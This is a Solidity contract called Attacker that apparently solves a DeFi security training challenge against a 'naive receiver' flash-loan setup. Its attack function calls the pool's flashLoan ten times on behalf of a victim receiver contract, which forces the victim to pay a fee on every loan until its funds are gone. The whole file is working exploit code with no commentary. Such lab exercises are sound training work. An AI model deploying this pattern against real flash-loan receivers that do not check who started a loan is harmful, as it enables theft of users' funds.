pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    NaiveReceiverLenderPool private pool;
    IERC3156FlashBorrower private receiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor (NaiveReceiverLenderPool pool_, IERC3156FlashBorrower receiver_) {
        pool = pool_;
        receiver = receiver_;
    }

    function attack() external {
        for (uint256 i; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 10 ether, "0x");
        }
    }
}